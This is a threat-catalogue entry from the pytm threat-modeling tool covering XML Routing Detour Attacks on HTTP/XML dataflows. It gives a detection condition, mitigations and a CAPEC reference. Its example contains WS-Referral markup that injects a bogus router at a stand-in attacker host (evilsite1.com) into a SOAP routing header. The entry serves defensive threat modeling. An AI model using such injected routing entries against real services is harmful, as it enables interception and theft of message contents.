sid: CR07
title: XML Routing Detour Attacks
source: pytm v1.4.0
pytm_targets:
- Dataflow
elements:
- flow
condition: target.protocol == 'HTTP' and any(d.format == 'XML' for d in target.data)
severity: Medium
likelihood: null
details: An attacker subverts an intermediate system used to process XML content and forces
  the intermediate to modify and/or re-route the processing of the content. XML Routing Detour
  Attacks are Man in the Middle type attacks. The attacker compromises or inserts an intermediate
  system in the processing of the XML message. For example, WS-Routing can be used to specify
  a series of nodes or intermediaries through which content is passed. If any of the intermediate
  nodes in this route are compromised by an attacker they could be used for a routing detour
  attack. From the compromised system the attacker is able to route the XML process to other
  nodes of his or her choice and modify the responses so that the normal chain of processing
  is unaware of the interception. This system can forward the message to an outside entity
  and hide the forwarding and processing from the legitimate processing systems by altering
  the header information.
mitigations: 'Design: Specify maximum number intermediate nodes for the request and require
  SSL connections with mutual authentication.Implementation: Use SSL for connections between
  all parties with mutual authentication.'
example: 'Here is an example SOAP call from a client, example1.com, to a target, example4.com,
  via 2 intermediaries, example2.com and example3.com. (note: The client here is not necessarily
  a ''end user client'' but rather the starting point of the XML transaction). Example SOAP
  message with routing information in header: &lt;S:Envelope&gt; &lt;S:Header&gt; &lt;m:path
  xmlns:m=http://schemas.example.com/rp/ S:actor=http://schemas.example.com/soap/actor S:mustUnderstand=1&gt;
  &lt;m:action&gt;http://example1.com/&lt;/m:action&gt; &lt;m:to&gt;http://example4.com/router&lt;/m:to&gt;
  &lt;m:id&gt;uuid:1235678-abcd-1a2b-3c4d-1a2b3c4d5e6f&lt;/m:id&gt; &lt;m:fwd&gt; &lt;m:via&gt;http://example2.com/router&lt;/m:via&gt;
  &lt;/m:fwd&gt; &lt;m:rev /&gt; &lt;/m:path&gt; &lt;/S:Header&gt; &lt;S:Body&gt; ... &lt;/S:Body&gt;
  &lt;/S:Envelope&gt; Add an additional node (example3.com/router) to the XML path in a WS-Referral
  message &lt;r:ref xmlns:r=http://schemas.example.com/referral&gt; &lt;r:for&gt; &lt;r:prefix&gt;http://example2.com/router&lt;/r:prefix&gt;
  &lt;/r:for&gt; &lt;r:if/&gt; &lt;r:go&gt; &lt;r:via&gt;http://example3.com/router&lt;/r:via&gt;
  &lt;/r:go&gt; &lt;/r:ref&gt; Resulting in the following SOAP Header:&lt;S:Envelope&gt; &lt;S:Header&gt;
  &lt;m:path xmlns:m=http://schemas.example.com/rp/ S:actor=http://schemas.example.com/soap/actor
  S:mustUnderstand=1&gt; &lt;m:action&gt;http://example1.com/&lt;/m:action&gt; &lt;m:to&gt;http://example4.com/router&lt;/m:to&gt;
  &lt;m:id&gt;uuid:1235678-abcd-1a2b-3c4d-1a2b3c4d5e6f&lt;/m:id&gt; &lt;m:fwd&gt; &lt;m:via&gt;http://example2.com/router&lt;/m:via&gt;
  &lt;m:via&gt;http://example3.com/router&lt;/m:via&gt; &lt;/m:fwd&gt; &lt;m:rev /&gt; &lt;/m:path&gt;
  &lt;/S:Header&gt; &lt;S:Body&gt;...&lt;/S:Body&gt; &lt;/S:Envelope&gt; In the following
  example, the attacker injects a bogus routing node (using a WS-Referral service) into the
  routing table of the XML header but not access the message directly on the initiator/intermediary
  node that he/she has targeted. Example of WS-Referral based WS-Routing injection of the
  bogus node route:&lt;r:ref xmlns:r=http://schemas.example.com/referral&gt; &lt;r:for&gt;
  &lt;r:prefix&gt;http://example2.com/router&lt;/r:prefix&gt; &lt;/r:for&gt; &lt;r:if/&gt;
  &lt;r:go&gt; &lt;r:via&gt;http://evilsite1.com/router&lt;/r:via&gt; &lt;/r:go&gt; &lt;/r:ref&gt;
  Resulting XML Routing Detour attack:&lt;S:Envelope&gt; &lt;S:Header&gt; &lt;m:path xmlns:m=http://schemas.example.com/rp/
  S:actor=http://schemas.example.com/soap/actor S:mustUnderstand=1&gt; &lt;m:action&gt;http://example_0.com/&lt;/m:action&gt;
  &lt;m:to&gt;http://example_4.com/router&lt;/m:to&gt; &lt;m:id&gt;uuid:1235678-abcd-1a2b-3c4d-1a2b3c4d5e6f&lt;/m:id&gt;
  &lt;m:fwd&gt; &lt;m:via&gt;http://example2.com/router&lt;/m:via&gt; &lt;m:via&gt;http://evilesite1.com/router&lt;/m:via&gt;
  &lt;m:via&gt;http://example3.com/router&lt;/m:via&gt; &lt;/m:fwd&gt; &lt;m:rev /&gt; &lt;/m:path&gt;
  &lt;/S:Header&gt; &lt;S:Body&gt; ... &lt;/S:Body&gt; &lt;/S:Envelope&gt; Thus, the attacker
  can route the XML message to the attacker controlled node (and access to the message contents).'
references: https://capec.mitre.org/data/definitions/219.html
prerequisites: The targeted system must have multiple stages processing of XML content.
